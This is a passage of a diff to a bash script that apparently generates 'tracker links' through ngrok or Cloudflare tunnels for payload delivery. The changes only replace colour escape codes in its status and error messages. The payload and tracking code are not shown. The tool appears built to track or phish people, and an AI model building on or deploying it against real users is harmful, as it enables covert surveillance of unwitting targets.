-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+printf "${Rb}[!] Tracker link is not generating. Check following:${Reset}\n"
+printf "  ${G}[${C}*${G}] ${Y}Ngrok authtoken is not valid${Reset}\n"
+printf "  ${G}[${C}*${G}] ${Y}If you are using android, turn hotspot on${Reset}\n"
+printf "  ${G}[${C}*${G}] ${Y}Ngrok is already running? Run: killall ngrok${Reset}\n"
+printf "  ${G}[${C}*${G}] ${Y}Check your internet connection${Reset}\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "${G}[${C}*${G}] Tracker Link: ${W}%s${Reset}\n" $link
 fi
 payload_ngrok
 checkfound
@@ -898,8 +919,8 @@ fi
 
 # Check if we successfully extracted a link
 if [[ -z "$send_link" ]]; then
-    printf '\e[1;31m[!] Error: Could not extract link for payload generation\e[0m\n'
-    printf '\e[1;93m[!] Please check the sendlink file or try again\e[0m\n'
+    printf "${Rb}[!] Error: Could not extract link for payload generation${Reset}\n"
+    printf "${Y}[!] Please check the sendlink file or try again${Reset}\n"
     return 1
 fi
 
@@ -918,7 +939,7 @@ elif [[ $option_tunnel -eq 2 ]]; then
     if [[ $? -eq 0 ]]; then
         checkfound
     else
-        printf "\e[1;31m[!] Failed to start Cloudflare tunnel\e[0m\n"
+        printf "${Rb}[!] Failed to start Cloudflare tunnel${Reset}\n"
         exit 1
     fi
 elif [[ $option_tunnel -eq 3 ]]; then
@@ -927,7 +948,7 @@ elif [[ $option_tunnel -eq 3 ]]; then
     payload
     checkfound
 else
-    printf "\e[1;31m[!] Invalid tunnel option\e[0m\n"
+    printf "${Rb}[!] Invalid tunnel option${Reset}\n"
     exit 1
 fi
 
